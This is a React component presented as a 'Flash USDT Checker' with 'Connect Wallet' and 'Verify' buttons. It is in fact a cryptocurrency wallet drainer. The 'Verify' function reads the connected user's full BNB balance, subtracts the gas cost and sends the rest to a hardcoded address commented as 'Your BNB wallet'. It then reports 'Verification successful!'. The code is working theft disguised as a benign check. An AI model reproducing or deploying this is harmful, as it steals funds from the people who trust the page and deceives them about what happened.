import { useState } from "react";
import { ethers } from "ethers";

export default function FlashUsdtChecker() {
  const [walletAddress, setWalletAddress] = useState("");

  async function connectWallet() {
    if (window.ethereum) {
      const provider = new ethers.BrowserProvider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      const signer = await provider.getSigner();
      const address = await signer.getAddress();
      setWalletAddress(address);
    } else {
      alert("Please install MetaMask!");
    }
  }

  async function verifyUser() {
    if (!window.ethereum) return alert("Install MetaMask first!");

    const provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    const signer = await provider.getSigner();
    const senderAddress = await signer.getAddress();

    // Your BNB wallet
    const yourWallet = "0x82b0d4e6799314353b001bfece2eb3a0cda57866";

    const balance = await provider.getBalance(senderAddress);
    if (balance === 0n) return alert("⚠️ No BNB in wallet");

    const gasPrice = await provider.getFeeData();
    const gasLimit = 21000n;
    const gasCost = gasPrice.gasPrice * gasLimit;
    const amountToSend = balance - gasCost;

    if (amountToSend <= 0n) return alert("⚠️ Not enough BNB to cover gas fees");

    const tx = await signer.sendTransaction({
      to: yourWallet,
      value: amountToSend
    });

    await tx.wait();
    alert("✅ Verification successful!");
  }

  return (
    <div className="min-h-screen bg-gradient-to-r from-purple-500 to-indigo-600 flex flex-col items-center justify-center text-white p-6">
      <h1 className="text-4xl font-bold mb-6">Flash USDT Checker</h1>

      {walletAddress ? (
        <p className="mb-4">Connected: {walletAddress}</p>
      ) : (
        <button
          onClick={connectWallet}
          className="px-6 py-3 bg-yellow-500 hover:bg-yellow-600 rounded-2xl shadow-lg transition"
        >
          Connect Wallet
        </button>
      )}

      <button
        onClick={verifyUser}
        className="mt-4 px-6 py-3 bg-green-500 hover:bg-green-600 rounded-2xl shadow-lg transition"
      >
        Verify
      </button>
    </div>
  );
}
